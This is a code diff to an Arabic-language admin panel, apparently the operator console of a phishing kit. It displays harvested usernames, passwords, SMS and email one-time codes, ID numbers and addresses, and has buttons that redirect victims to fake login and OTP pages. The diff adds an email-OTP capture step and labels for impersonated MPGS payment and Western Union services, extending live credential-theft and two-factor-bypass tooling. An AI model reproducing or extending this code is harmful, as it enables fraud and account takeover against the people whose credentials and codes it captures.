@@ -558,10 +558,12 @@
   <div class="modal-overlay" id="detailsModal">
     <div class="modal-box">
       <h2>تفاصيل الطلب</h2>
+      <div class="modal-row" id="mServiceRow" style="display:none;"><span class="k">الخدمة</span><span class="v" id="mService" style="color:#1f4e8c;font-weight:700;"></span></div>
       <div class="modal-row" id="mStepRow" style="display:none;"><span class="k">الخطوة الحالية</span><span class="v" id="mStep" style="color:#c8a45a;font-weight:700;"></span></div>
       <div class="modal-row"><span class="k">اسم المستخدم</span><span class="v"><span id="mUsername"></span><button type="button" class="copy-btn" data-copy="mUsername"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></span></div>
       <div class="modal-row"><span class="k">كلمة المرور</span><span class="v"><span id="mPassword"></span><button type="button" class="copy-btn" data-copy="mPassword"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></span></div>
       <div class="modal-row"><span class="k">OTP</span><span class="v"><span id="mOtp"></span><button type="button" class="copy-btn" data-copy="mOtp"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></span></div>
+      <div class="modal-row"><span class="k">OTP بريد</span><span class="v"><span id="mOtp2"></span><button type="button" class="copy-btn" data-copy="mOtp2"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></span></div>
       <div class="modal-row" id="mForgotEmailRow" style="display:none;"><span class="k">بريد الاسترجاع</span><span class="v" id="mForgotEmail"></span></div>
       <div class="modal-row" id="mForgotUsernameRow" style="display:none;"><span class="k">مستخدم الاسترجاع</span><span class="v" id="mForgotUsername"></span></div>
       <div class="modal-row"><span class="k">الاسم</span><span class="v" id="mName"></span></div>
@@ -591,6 +593,7 @@
       <h2>إعادة توجيه المستخدم إلى:</h2>
       <button type="button" class="redirect-page-btn" data-page="login">تسجيل الدخول</button>
       <button type="button" class="redirect-page-btn" data-page="otp">رمز التحقق (OTP)</button>
+      <button type="button" class="redirect-page-btn" data-page="otp2">رمز التحقق عبر البريد</button>
       <button type="button" class="redirect-page-btn" data-page="forgot">نسيت بيانات الاعتماد</button>
       <button type="button" class="redirect-page-btn" data-page="forgot-username">نسيت اسم المستخدم</button>
       <button type="button" class="redirect-page-btn" data-page="forgot-password">نسيت كلمة السر</button>
@@ -726,12 +729,19 @@
     var pollTimer = null;
 
     var stepLabels = {
+      'service': 'طلب خدمة',
       'login': 'بيانات تسجيل الدخول',
       'otp': 'OTP',
+      'otp2': 'OTP بريد إلكتروني',
       'forgot-username': 'نسيت اسم المستخدم',
       'forgot-username-confirm': 'تأكيد اسم المستخدم',
       'forgot-username-password': 'كلمة المرور (نسيت المستخدم)',
       'forgot-password': 'نسيت كلمة السر'
+    };
+
+    var serviceLabels = {
+      'mpgs': 'خدمة الدفع الإلكتروني MPGS',
+      'western-union': 'ويسترن يونيون'
     };
 
     function statusLabel(status, step){
@@ -749,8 +759,14 @@
         var row = document.createElement('tr');
         row.dataset.id = r.id;
         var usernameCell = escapeHtml(r.username || '-');
+        var serviceTag = '';
+        if (r.service && serviceLabels[r.service]) {
+          serviceTag = '<span style="color:#1f4e8c;font-weight:700;font-size:10px;display:block;">' + serviceLabels[r.service] + '</span>';
+        }
         if (r.step && stepLabels[r.step]) {
-          usernameCell = '<span style="color:#c8a45a;font-weight:700;font-size:11px;">' + stepLabels[r.step] + '</span><br>' + escapeHtml(r.username || r.forgotEmail || r.forgotUsername || '-');
+          usernameCell = serviceTag + '<span style="color:#c8a45a;font-weight:700;font-size:11px;">' + stepLabels[r.step] + '</span><br>' + escapeHtml(r.username || r.forgotEmail || r.forgotUsername || '-');
+        } else if (serviceTag) {
+          usernameCell = serviceTag + escapeHtml(r.username || '-');
         }
         row.innerHTML =
           '<td>' + usernameCell + '</td>' +
@@ -867,6 +883,7 @@
       document.getElementById('mUsername').textContent = r.username || '-';
       document.getElementById('mPassword').textContent = r.password || '-';
       document.getElementById('mOtp').textContent = r.otp || '-';
+      document.getElementById('mOtp2').textContent = r.otp2 || '-';
       document.getElementById('mName').textContent = r.name || '-';
       document.getElementById('mIdNumber').textContent = r.idNumber || '-';
       document.getElementById('mPhone').textContent = r.phone || '-';
@@ -874,6 +891,13 @@
       document.getElementById('mCity').textContent = r.city || '-';
       document.getElementById('mAddress').textContent = r.address || '-';
       document.getElementById('mWatchColor').textContent = r.watchColor || '-';
+      var serviceRow = document.getElementById('mServiceRow');
+      if (r.service && serviceLabels[r.service]) {
+        document.getElementById('mService').textContent = serviceLabels[r.service];
+        serviceRow.style.display = '';
+      } else {
+        serviceRow.style.display = 'none';
+      }
       var stepRow = document.getElementById('mStepRow');
       if (r.step && stepLabels[r.step]) {
         document.getElementById('mStep').textContent = stepLabels[r.step];
